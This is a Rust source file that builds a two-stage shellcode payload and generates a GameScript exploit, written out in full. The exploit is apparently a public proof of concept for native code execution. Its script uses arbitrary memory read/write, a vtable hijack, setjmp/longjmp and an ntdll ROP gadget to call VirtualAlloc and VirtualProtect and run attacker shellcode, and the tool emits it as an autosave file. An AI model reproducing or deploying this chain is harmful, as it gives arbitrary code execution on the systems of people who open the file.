use anyhow::Result;
use goblin::pe::PE;
use iced_x86::{Decoder, DecoderOptions, Formatter, Instruction, NasmFormatter};
use itertools::Itertools;
use std::fs::File;
use std::io::prelude::*;
use std::io::BufWriter;
use std::path::Path;
use std::path::PathBuf;

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let output_path = Path::new(args[1].as_str());

    let stage1_path =
        "..\\shellcode_stage1\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage1.exe";

    let stage1_output = rewrite_shellcode(stage1_path)?;

    let stage2_path =
        "..\\shellcode_stage2\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage2.exe";
    let stage2_output = rewrite_shellcode(stage2_path)?;

    // generate the exploit code to load the stage1 code
    let gamescript_exploit = generate_gamescript_exploit(&stage1_output)?;

    if !output_path.exists() {
        std::fs::create_dir(output_path)?;
    }

    let gs_path = output_path.join("gamescript_autosave.txt");
    std::fs::write(gs_path, gamescript_exploit.as_bytes())?;

    std::fs::copy(stage1_output, output_path.join("stage1.bin"))?;
    std::fs::copy(stage2_output, output_path.join("stage2.bin"))?;

    println!("done! artifacts can be found in outputs/");

    Ok(())
}

// Patch the prologue of the shellcode to rewrite the load offsets
pub fn rewrite_shellcode(src_path: &str) -> Result<PathBuf> {
    println!("[*] Patching shellcode for file {src_path}");

    let mut file = File::open(src_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // Parse the PE and adjust load address
    let pe = PE::parse(&mut buffer)?;
    let standard_fields = pe.header.optional_header.unwrap().standard_fields;
    let entry_offset = standard_fields.address_of_entry_point - standard_fields.base_of_code;

    // Take the input filename and make the output file the same name,
    // but with .bin extension
    let mut dst_path = PathBuf::from(src_path);
    dst_path.set_extension("bin");

    // Flatten the sections together
    for section in pe.sections {
        let name = String::from_utf8(section.name.to_vec())?;
        if !name.starts_with(".text") {
            continue;
        }
        let start = section.pointer_to_raw_data as usize;
        // we use virtual size instead of raw size to remove any padding data
        let size = section.virtual_size as usize;

        let shellcode = File::create(&dst_path)?;
        let mut buf_writer = BufWriter::new(shellcode);
        println!("[*] section text addr: 0x{:x}, size: 0x{:x}", start, size);
        println!("[*] entry offset: 0x{:x}", entry_offset);
        println!("== before patch ==");
        show_disassemble(&buffer[start..start + size], 5);
        if entry_offset >= 0x100 {
            buffer[0 + start] = 0xe9;
            let hi = (entry_offset - 2) / 0x100;
            let li = (entry_offset - 2) % 0x100;
            dbg!(hi, li);
            buffer[1 + start] = li as _;
            buffer[2 + start] = hi as _;
            buffer[3 + start] = 0 as _;
            buffer[4 + start] = 0 as _;
        } else if entry_offset >= 0x80 {
            buffer[0 + start] = 0xe9;
            buffer[1 + start] = (entry_offset - 5) as _;
            buffer[2 + start] = 0 as _;
            buffer[3 + start] = 0 as _;
            buffer[4 + start] = 0 as _;
        } else {
            buffer[0 + start] = 0xeb;
            buffer[1 + start] = (entry_offset - 2) as _;
        }
        println!("== after patch ==");
        show_disassemble(&buffer[start..start + size], 5);

        buf_writer.write_all(&buffer[start..start + size])?;
        buf_writer.flush().unwrap();
    }

    Ok(dst_path)
}

pub fn show_disassemble(bytes: &[u8], max_line: u32) {
    let mut decoder = Decoder::new(EXAMPLE_CODE_BITNESS, bytes, DecoderOptions::NONE);
    decoder.set_ip(EXAMPLE_CODE_RIP);
    let mut formatter = NasmFormatter::new();
    formatter.options_mut().set_digit_separator("`");
    formatter.options_mut().set_first_operand_char_index(10);
    let mut output = String::new();
    let mut instruction = Instruction::default();
    let mut i = 0;
    while decoder.can_decode() {
        i += 1;
        if i > max_line {
            println!("....\n");
            break;
        }
        decoder.decode_out(&mut instruction);
        output.clear();
        formatter.format(&instruction, &mut output);
        print!("{:016X} ", instruction.ip());
        let start_index = (instruction.ip() - EXAMPLE_CODE_RIP) as usize;
        let instr_bytes = &bytes[start_index..start_index + instruction.len()];
        for b in instr_bytes.iter() {
            print!("{:02X}", b);
        }
        if instr_bytes.len() < HEXBYTES_COLUMN_BYTE_LENGTH {
            for _ in 0..HEXBYTES_COLUMN_BYTE_LENGTH - instr_bytes.len() {
                print!("  ");
            }
        }
        println!(" {}", output);
    }
}

const HEXBYTES_COLUMN_BYTE_LENGTH: usize = 10;
const EXAMPLE_CODE_BITNESS: u32 = 64;
const EXAMPLE_CODE_RIP: u64 = 0x0000_0001_4000_1000; // 0000 0001 4000 1000

fn generate_gamescript_exploit(shellcode_path: &Path) -> anyhow::Result<String> {
    let shellcode_data: String = std::fs::read(shellcode_path)?
        .iter()
        .map(|b| format!("{:#X}", *b))
        .intersperse(", ".to_string())
        .collect();
    Ok(format!(
        r#"// native code exec PoC via Game Script - @carrot_c4k3 (exploits.forsale)
//
// sample shellcode: mov rax, 0x1337; ret;
// drop your own shellcode inplace here
let shellcode = [
{shellcode_data}
]



// hex printing helper functions
let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
let c2i_map = {{'0': 0, '1': 1, '2': 3, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}}

fn hex_to_num(s) {{
	var str_len = len(s)
	var res = 0
	for (var i = 0; i < str_len; i++)
	{{
		res = res << 4
		res = res + c2i_map[s[i]]
	}}
	return res
}}

fn num_to_hex(num, byte_count) {{
	if (byte_count > 8) {{
		byte_count = 8
	}}
	var res = ""
	for (var i = 0; i < byte_count * 2; i++) {{
		var idx = (num >> (4 * i)) & 15
		res = i2c_map[idx] + res 
	}}
	return res
}}

fn num_to_hex8(num) {{
	return num_to_hex(num, 1)
}}

fn num_to_hex16(num) {{
	return num_to_hex(num, 2)
}}

fn num_to_hex32(num) {{
	return num_to_hex(num, 4)
}}

fn num_to_hex64(num) {{
	return num_to_hex(num, 8)
}}

fn hex_dump(addr, count) {{
	for (var i = 0; i < count; i++) {{
		if (i > 0 && (i % 16) == 0) {{
			printConsole("\n")
        }}
		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
		printConsole(num_to_hex8(cur_byte) + " ")
	}}
}}

fn array_fill(arr) {{
	var arr_len = len(arr)
	for (var i = 0; i < arr_len; i++) {{
		arr[i] = 0x41
	}}
}}

fn round_down(val, bound) {{
	return floor(val - (val % bound))
}}

fn array_compare(a1, a2) {{
	if (len(a1) != len(a2)) {{
		return false
	}}
	var arr_len = len(a1)
	
	for (var i = 0; i < arr_len; i++) {{
		if (a1[i] != a2[i]) {{
			return false
        }}
	}}

	return true
}}

// shorthand helpers for memory access
fn write8(addr, val) {{
	pointerSetUnsignedInteger8Bit(0, addr, val)
}}

fn read8(addr) {{
	return pointerGetUnsignedInteger8Bit(0, addr)
}}

fn write16(addr, val) {{
	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
}}

fn read16(addr) {{
	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
}}

fn write32(addr, val) {{
	pointerSetAtOffsetUnsignedInteger(0, addr, val)
}}

fn read32(addr) {{
	return pointerGetAtOffsetUnsignedInteger(0, addr)
}}


fn write64(addr, val) {{
	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
}}

fn read64(addr) {{
	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
}}

fn read_buf(addr, buf) {{
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {{
		buf[i] = read8(addr + i)
	}}
}}

fn write_buf(addr, buf) {{
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {{
		write8(addr+i, buf[i])
	}}
}}

fn find_bytes(addr, max_len, pattern, buf) {{
	for (var i = 0; i < max_len; i++) {{
		read_buf(addr + i, buf)
		if (array_compare(pattern, buf)) {{
			return addr + i
        }}
	}}
	return 0
}}

fn find64(addr, max_len, v) {{
	var offset = 0
	while (1) {{
		var temp_val = read64(addr+offset)
		if (temp_val == v) {{
			return addr+offset
        }}
		offset += 8
	}}
	return 0
}}

// shorthand funcs
fn ptr_to_num(p) {{
	return numberFromRaw64BitUnsignedInteger(p)
}}

var gs_base = 0
var ntdll_base = 0
var kernelbase_base = 0
var longjmp_ptr = 0
var setjmp_ptr = 0
var gadget_ptr = 0
fn call_native(func_ptr, rcx, rdx, r8, r9) {{
	// allocate our objects
	var obj_ptr = globalArrayNew8Bit("call", 0x100)
	var objp = ptr_to_num(obj_ptr)
	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
	var vtp = ptr_to_num(vt_ptr)
	var stack_size = 0x4000
	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
	var stackp = ptr_to_num(stack_ptr)
	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
	var jcp = ptr_to_num(jmpctx_ptr)

	// set up vtable pointers
	write64(vtp+8, setjmp_ptr)
	write64(objp, vtp)

	// trigger vtable call
	slBus_destroy(obj_ptr)
	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)

	// set up our rop chain
	write64(stackp+stack_size-0xA0, rdx)
	write64(stackp+stack_size-0x98, rcx)
	write64(stackp+stack_size-0x90, r8)
	write64(stackp+stack_size-0x88, r9)
	write64(stackp+stack_size-0x80, 0)
	write64(stackp+stack_size-0x78, 0)
	write64(stackp+stack_size-0x70, func_ptr)
	write64(stackp+stack_size-0x68, gs_base+0x1F13A)
	write64(stackp+stack_size-0x38, 0x15151515)
	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
	write64(stackp+stack_size-0x28, jcp)
	write64(stackp+stack_size-0x20, longjmp_ptr);
	
	// set up the vtable and setjmp context
	write64(vtp+8, longjmp_ptr)
	write64(objp, vtp)
	write64(objp+0x10, stackp+stack_size-0xA0)
	write64(objp+0x50, gadget_ptr)
	
	// trigger vtable call
	slBus_destroy(obj_ptr)
	var ret_val = read64(stackp+stack_size-0x68)

	// clean up our objects
	globalArrayDelete("call")
	globalArrayDelete("vtable")
	globalArrayDelete("stack")
	globalArrayDelete("jctx")

	return ret_val
}}

fn find_module_base(addr) {{
	var search_addr = round_down(addr, 0x10000)	

	while (1) {{
		var magic_static = [0x4D, 0x5A]
		var magic_read = [0, 0]
		read_buf(search_addr, magic_read)

		if (array_compare(magic_static, magic_read)) {{
			return search_addr
        }}
		search_addr -= 0x10000
	}}
	return 0
}}

fn get_dll_exports(base_addr) {{
	var res = {{}}
	var magic_static = [0x4D, 0x5A]
	var magic_read = [0, 0]
	read_buf(base_addr, magic_read)

	if (!array_compare(magic_static, magic_read)) {{
		printConsole("Magic is invalid!\n")
		return res
	}}

	
	var e_lfanew = read32(base_addr+0x3c)
	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)

	var num_funcs = read32(exports_addr+0x14)
	var num_names = read32(exports_addr+0x18)

	var funcs_addr = base_addr + read32(exports_addr+0x1c)
	var names_addr = base_addr + read32(exports_addr+0x20)
	var ords_addr = base_addr + read32(exports_addr+0x24)

	for (var i = 0; i < num_names; i++) {{
		var name_addr = base_addr + read32(names_addr + (4 * i))
		var name_str = pointerGetSubstring(0, name_addr, 0x20)
		var ordinal = read16(ords_addr + (2 * i))
		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
		res[name_str] = func_addr
	}}

	return res
}}

var VirtualAlloc_ptr = 0
var VirtualProtect_ptr = 0
fn map_code(code) {{
	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
	write_buf(code_addr, code)

	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
	var oldpp = ptr_to_num(oldp_ptr)
	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
	return code_addr
}}

// create and dump our object to the terminal
var slbus_ptr = slBus_create()
var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)

// get the base of the GameScript module via the vtable
gs_base = read64(slp) - 0x16faf8

// find base addresses of ntdll and kernelbase
ntdll_base = find_module_base(read64(gs_base + 0x125398))
kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))

// find longjmp and setjmp for call_native
var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)

// find one of our gadgets in ntdll
var gadget_bytes = [0x5A,0x59,0x41,0x58,0x41,0x59,0x41,0x5A,0x41,0x5B,0xC3]
tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0]
gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)

// get the ntdll & kernel base exports and find VirtualAlloc/Protect
var kernelbase_exports = get_dll_exports(kernelbase_base)
var ntdll_exports = get_dll_exports(ntdll_base)
VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]

// map our shellcode
var shellcode_addr = map_code(shellcode)
var shellcode_ret = call_native(shellcode_addr, 0, 0, 0, 0)

printConsole("Shellcode return value: " + num_to_hex64(shellcode_ret) + "\n")
"#
    ))
}
